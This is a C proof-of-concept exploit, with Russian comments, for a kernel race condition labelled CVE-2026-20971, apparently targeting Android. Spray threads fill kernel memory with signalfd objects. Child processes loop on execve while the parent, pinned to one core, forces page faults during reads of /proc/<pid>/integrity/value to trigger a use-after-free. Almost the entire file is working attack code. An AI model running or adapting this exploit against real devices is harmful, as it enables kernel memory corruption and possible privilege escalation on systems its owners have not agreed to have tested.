#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <sys/signalfd.h>
#include <pthread.h>
#include <sys/resource.h>
#include <time.h>

void* spray_thread(void* arg) {
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGUSR1);

    while(1) {
        // Создаем объект signalfd_ctx в ядре
        int sfd = signalfd(-1, &mask, 0);
        if (sfd < 0) {
            // Если лимит исчерпан, просто спим
            usleep(1000);
        }
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    srand(time(NULL));

    // 1. Поднимаем лимит файловых дескрипторов до 100 000
    struct rlimit rlim = {100000, 100000};
    if (setrlimit(RLIMIT_NOFILE, &rlim) != 0) {
        perror("[-] setrlimit failed");
    }

    printf("[*] CVE-2026-20971 Race Condition PoC v4 (Multi-core)\n");

    // 2. Запускаем 4 потока для спрея памяти signalfd
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // 3. Форкаем 4 дочерних процесса для постоянного execve
    pid_t pids[4];
    for (int i=0; i<4; i++) {
        pids[i] = fork();
        if (pids[i] == 0) {
            // Привязываем к разным ядрам (CPU 1, 2, 3)
            cpu_set_t set;
            CPU_ZERO(&set);
            CPU_SET(1 + (i % 3), &set); 
            sched_setaffinity(0, sizeof(set), &set);
            
            char *argv[] = {"/system/bin/true", NULL};
            char *envp[] = {NULL};
            while (1) {
                execve("/system/bin/true", argv, envp);
                _exit(1);
            }
        }
    }

    printf("[*] Started 4 children: %d, %d, %d, %d\n", pids[0], pids[1], pids[2], pids[3]);

    // 4. Родительский процесс (атакующий)
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set); // Привязываем родителя к CPU 0
    sched_setaffinity(0, sizeof(set), &set);

    // Выделяем страницу для вызова page fault
    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char path[64];
    long iterations = 0;

    while (1) {
        // Случайно выбираем одну из 4 жертв
        int idx = rand() % 4;
        snprintf(path, sizeof(path), "/proc/%d/integrity/value", pids[idx]);

        // Сбрасываем страницу
        madvise(buf, 4096, MADV_DONTNEED);

        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            // read вызовет page fault, и ядро уснет.
            // В это время один из 4 детей выполнит execve и освободит память.
            read(fd, buf, 4096); 
            close(fd);
        }
        
        iterations++;
        if (iterations % 500000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}